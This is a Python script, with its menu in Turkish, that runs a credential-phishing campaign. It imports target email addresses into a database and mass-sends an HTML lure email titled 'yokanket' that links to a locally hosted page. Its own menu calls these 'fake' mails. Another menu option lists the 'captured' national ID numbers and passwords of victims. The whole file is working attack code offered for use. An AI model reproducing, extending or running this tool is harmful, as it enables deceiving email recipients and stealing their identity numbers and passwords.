from pydoc import doc
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pymysql.cursors
db = pymysql.connect(host='db',
                    user='root',
                    password='',
                    db='project',
                    charset='utf8mb4',
                    cursorclass=pymysql.cursors.DictCursor)
cursor=db.cursor()
def mail_gonder(alici, gonderen):
    mail=smtplib.SMTP("smtp.outlook.office365.com",587)
    mail.ehlo()
    mail.starttls()
    mail.login("your mail", "your password") 
    mesaj=MIMEMultipart()
    mesaj["FROM"]=gonderen
    mesaj["TO"]=alici
    mesaj["SUBJECT"]="yokanket"
    body="""
        <html>
            <head>
            </head>
            <body>
                <a  href="http://127.0.0.1:5000/"><img src="https://scontent.fesb7-1.fna.fbcdn.net/v/t39.30808-6/301893938_396769675869114_2682069263850222478_n.jpg?_nc_cat=105&ccb=1-7&_nc_sid=730e14&_nc_ohc=pn0FayIuEfwAX80eEus&tn=LR-XtK-XMt9-7PmL&_nc_ht=scontent.fesb7-1.fna&oh=00_AT9mNBqvqzmrYa_zt8D9xthcLIfMSsF5RKvqzxPlHNJR-A&oe=63248531" alt="" /></a>
            </body>
        </html>
    """
    body_text=MIMEText(body,"html")
    mesaj.attach(body_text)
    mail.sendmail(mesaj["FROM"], mesaj["TO"], mesaj.as_string())

while True:
    print("1.Bir txt dosyasındaki mailleri kaydetmek istiyorsanız 1'i seçin\n2.Kaydedilmiş mailleri görmek istiyorsanız 2'yi seçiniz")
    print("3.Maillere sahte maili gindermek istiyorsanız 3'ü seçiniz\n4.Ele geçirilmiş verileri görmek için 4'e basın\nÇıkmak için 5'e basın")
    secenek=int(input("Lütfen bir seçenek seçiniz:"))
    if secenek==1:
        path_file=input("lütfen dosya yolunu giriniz: örnek:C:\\Users\CASPER\Desktop\email.txt")
        file=open(path_file,"r")
        for i in file:
            command="Insert into email (emailadi) values(%s)"
            value=('{0}'.format(i))
            temp=cursor.execute(command,value)
            db.commit()
    elif secenek==2:
        cursor.execute("Select * from email")
        temp1=cursor.fetchall()
        for i in temp1:
            print(i["emailadi"])
    elif secenek==3:
        cursor.execute("Select * from email")
        temp=cursor.fetchall()
        for i in temp:
            mail_gonder(i["emailadi"], 'ergintren13@outlook.com')
            print("Mail şu hesaba gönderildi:",i["emailadi"])
    elif secenek==4:
        cursor.execute("Select * from alinan_veri")
        temp2=cursor.fetchall()
        for i in temp2:
            print("Tc_no:{0} - Sifre:{1}".format(i["tc_no"],i["sifre"]))
    elif secenek==5:
        break
    else:
        print("Lütfen belirtilen seçeneklerden seçiniz")

